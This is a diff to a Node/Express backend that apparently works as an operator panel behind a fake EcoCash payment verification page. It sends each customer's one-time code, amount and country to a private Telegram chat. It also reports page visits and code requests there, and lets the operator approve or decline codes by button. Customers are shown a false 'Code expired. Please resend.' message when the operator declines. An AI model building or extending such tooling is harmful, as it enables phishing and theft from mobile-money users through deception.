@@ -68,7 +68,7 @@ setInterval(() => {
 }, 60 * 60 * 1000);
 
 /* ============================================================
-   Pending decisions (approval flow)
+   Pending decisions (payment approval flow)
 ============================================================ */
 const PENDING = new Map();
 
@@ -108,13 +108,13 @@ function tgBase() {
 /* ============================================================
    OTP store + event de-dupe
 ============================================================ */
-const OTP_STORE      = new Map();   // tx → { code, exp, attempts }
-const OTP_RATE       = new Map();   // tx → last request ms
-const EVENT_DEDUPE   = new Map();   // tx:type → last sent ms
+const OTP_STORE        = new Map();   // tx → { code, exp, attempts, decision }
+const OTP_RATE         = new Map();   // tx → last request ms
+const EVENT_DEDUPE     = new Map();   // tx:type → last sent ms
 const OTP_MAX_ATTEMPTS = 5;
-const OTP_TTL_MS       = 5 * 60 * 1000;   // 5 minutes
-const OTP_RATE_MS      = 30 * 1000;       // 30 s between requests
-const EVENT_DEDUPE_MS  = 15 * 1000;       // ignore same event within 15 s
+const OTP_TTL_MS       = 5 * 60 * 1000;
+const OTP_RATE_MS      = 30 * 1000;
+const EVENT_DEDUPE_MS  = 15 * 1000;
 
 /* ============================================================
    POST /api/accept — send Telegram message with buttons
@@ -188,7 +188,7 @@ app.post('/api/accept', async (req, res) => {
 });
 
 /* ============================================================
-   GET /api/status/:tx — client polls this
+   GET /api/status/:tx — payment approval poll
 ============================================================ */
 app.get('/api/status/:tx', (req, res) => {
   const tx = req.params.tx;
@@ -197,17 +197,15 @@ app.get('/api/status/:tx', (req, res) => {
 
 /* ============================================================
    POST /api/telegram-webhook — Approve / Decline tap
+   Handles BOTH:
+     - Payment decisions:  approve:TXN-…, decline:TXN-…
+     - OTP decisions:      approve:OTP-TXN-…, decline:OTP-TXN-…
 ============================================================ */
 app.post('/api/telegram-webhook', async (req, res) => {
   pushLog('WEBHOOK HIT', 'info');
 
   const update = req.body || {};
-
-  try {
-    pushLog('WEBHOOK PAYLOAD: ' + JSON.stringify(update).slice(0, 300), 'info');
-  } catch (e) {
-    pushLog('WEBHOOK PAYLOAD: unstringifiable', 'err');
-  }
+  try { pushLog('WEBHOOK PAYLOAD: ' + JSON.stringify(update).slice(0, 300), 'info'); } catch (e) {}
 
   const cb = update.callback_query;
 
@@ -217,13 +215,31 @@ app.post('/api/telegram-webhook', async (req, res) => {
     const raw = String(cb.data);
     const idx = raw.indexOf(':');
     const action = idx >= 0 ? raw.slice(0, idx) : raw;
-    const txId   = idx >= 0 ? raw.slice(idx + 1) : '';
+    const payload = idx >= 0 ? raw.slice(idx + 1) : '';
 
-    pushLog('PARSED action=' + action + ' tx=' + txId, 'info');
+    let otpTxId = null;
+    let txId = payload;
+    if (payload.startsWith('OTP-')) {
+      otpTxId = payload.slice(4);
+      txId = otpTxId;
+    }
 
-    if (action === 'approve') setDecision(txId, 'approved');
-    else if (action === 'decline') setDecision(txId, 'declined');
-    else pushLog('Unknown callback action: ' + action, 'err');
+    pushLog('PARSED action=' + action + ' tx=' + txId + (otpTxId ? ' (OTP)' : ''), 'info');
+
+    if (otpTxId) {
+      const entry = OTP_STORE.get(otpTxId);
+      if (entry) {
+        entry.decision = action === 'approve' ? 'approved' : 'declined';
+        pushLog('OTP decision ' + entry.decision + ' for ' + otpTxId,
+          entry.decision === 'approved' ? 'ok' : 'err');
+      } else {
+        pushLog('OTP entry not found for ' + otpTxId, 'err');
+      }
+    } else {
+      if (action === 'approve') setDecision(txId, 'approved');
+      else if (action === 'decline') setDecision(txId, 'declined');
+      else pushLog('Unknown callback action: ' + action, 'err');
+    }
 
     const baseUrl = tgBase();
     if (baseUrl) {
@@ -232,7 +248,7 @@ app.post('/api/telegram-webhook', async (req, res) => {
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({
           callback_query_id: cb.id,
-          text: action === 'approve' ? 'Approved' : (action === 'decline' ? 'Declined' : 'OK')
+          text: action === 'approve' ? 'Approved' : 'Declined'
         })
       }).catch(() => {});
 
@@ -256,7 +272,7 @@ app.post('/api/telegram-webhook', async (req, res) => {
 });
 
 /* ============================================================
-   Telegram — send event notification (with de-dupe)
+   Telegram — send event notification
 ============================================================ */
 async function sendTelegram(text) {
   const baseUrl = tgBase();
@@ -275,28 +291,20 @@ async function sendTelegram(text) {
 
 app.post('/api/telegram/event', async (req, res) => {
   const { type, tx, am, cur, c } = req.body || {};
-
-  if (!type || !tx) {
-    return res.status(400).json({ error: 'Missing type or tx' });
-  }
+  if (!type || !tx) return res.status(400).json({ error: 'Missing type or tx' });
 
   const allowed = ['page_opened', 'otp_requested', 'verification_success'];
-  if (!allowed.includes(type)) {
-    return res.status(400).json({ error: 'Unknown event type' });
-  }
+  if (!allowed.includes(type)) return res.status(400).json({ error: 'Unknown event type' });
 
-  // De-dupe identical events per transaction within 15 s
   const key = tx + ':' + type;
   const now = Date.now();
   const last = EVENT_DEDUPE.get(key) || 0;
-  if (now - last < EVENT_DEDUPE_MS) {
-    return res.json({ ok: true, deduped: true });
-  }
+  if (now - last < EVENT_DEDUPE_MS) return res.json({ ok: true, deduped: true });
   EVENT_DEDUPE.set(key, now);
 
   const label =
-    type === 'page_opened'         ? '👀 Verification page opened' :
-    type === 'otp_requested'       ? '📨 OTP requested' :
+    type === 'page_opened'          ? '👀 Verification page opened' :
+    type === 'otp_requested'        ? '📨 OTP requested' :
                                       '✅ Verification completed';
 
   const lines = [
@@ -310,15 +318,14 @@ app.post('/api/telegram/event', async (req, res) => {
 
   sendTelegram(lines.join('\n'));
   pushLog('Event sent to Telegram: ' + type + ' for ' + tx, 'ok');
-
   res.json({ ok: true });
 });
 
 /* ============================================================
-   Verification — request an OTP
+   Verification — request OTP, send to Telegram with buttons
 ============================================================ */
-app.post('/api/verification/otp', (req, res) => {
-  const { tx } = req.body || {};
+app.post('/api/verification/otp', async (req, res) => {
+  const { tx, am, cur, c } = req.body || {};
   if (!tx) return res.status(400).json({ message: 'Missing transaction' });
 
   const now = Date.now();
@@ -330,25 +337,70 @@ app.post('/api/verification/otp', (req, res) => {
   OTP_RATE.set(tx, now);
 
   const code = String(Math.floor(100000 + Math.random() * 900000));
-  OTP_STORE.set(tx, { code, exp: now + OTP_TTL_MS, attempts: 0 });
+  OTP_STORE.set(tx, { code, exp: now + OTP_TTL_MS, attempts: 0, decision: 'pending' });
 
   pushLog('OTP for ' + tx + ': ' + code, 'info');
+
+  const baseUrl = tgBase();
+  const chatId = process.env.TELEGRAM_CHAT_ID;
+
+  if (baseUrl && chatId) {
+    const lines = [
+      'EcoCash verification code',
+      '',
+      'Transaction: ' + tx,
+      'Amount: ' + (cur || 'USD') + ' ' + Number(am || 0).toFixed(2),
+      'Country: ' + (c || '—'),
+      'Code: ' + code,
+      '',
+      'Approve this code, or decline if the customer must re-enter.'
+    ];
+
+    const keyboard = {
+      inline_keyboard: [[
+        { text: '✅ Approve code', callback_data: 'approve:OTP-' + tx },
+        { text: '❌ Decline code', callback_data: 'decline:OTP-' + tx }
+      ]]
+    };
+
+    try {
+      await fetch(baseUrl + '/sendMessage', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          chat_id: chatId,
+          text: lines.join('\n'),
+          reply_markup: keyboard
+        })
+      });
+      pushLog('OTP sent to Telegram with buttons: ' + tx, 'ok');
+    } catch (e) {
+      pushLog('OTP Telegram send failed: ' + e.message, 'err');
+    }
+  }
 
   res.json({ ok: true, message: 'Code sent' });
 });
 
 /* ============================================================
-   Verification — verify OTP
+   Verification — verify OTP (requires prior Approve in Telegram)
 ============================================================ */
 app.post('/api/verification/verify', (req, res) => {
   const { tx, otp } = req.body || {};
   if (!tx || !otp) return res.status(400).json({ success: false, message: 'Missing fields' });
 
   const entry = OTP_STORE.get(tx);
-  if (!entry) return res.status(400).json({ success: false, message: 'No code requested' });
+  if (!entry) return res.status(400).json({ success: false, message: 'Code expired. Please resend.' });
   if (Date.now() > entry.exp) {
     OTP_STORE.delete(tx);
-    return res.status(400).json({ success: false, message: 'Code expired' });
+    return res.status(400).json({ success: false, message: 'Code expired. Please resend.' });
+  }
+  if (entry.decision === 'declined') {
+    OTP_STORE.delete(tx);
+    return res.status(400).json({ success: false, message: 'Code expired. Please resend.' });
+  }
+  if (entry.decision !== 'approved') {
+    return res.status(202).json({ success: false, pending: true, message: 'Awaiting approval' });
   }
   if (entry.attempts >= OTP_MAX_ATTEMPTS) {
     OTP_STORE.delete(tx);
@@ -365,6 +417,18 @@ app.post('/api/verification/verify', (req, res) => {
   setDecision(tx, 'approved');
   pushLog('OTP verified for ' + tx, 'ok');
   res.json({ success: true });
+});
+
+/* ============================================================
+   Verification — poll the OTP decision
+============================================================ */
+app.get('/api/verification/status/:tx', (req, res) => {
+  const tx = req.params.tx;
+  const entry = OTP_STORE.get(tx);
+  res.json({
+    transactionId: tx,
+    decision: entry ? entry.decision : 'expired'
+  });
 });
 
 /* ============================================================
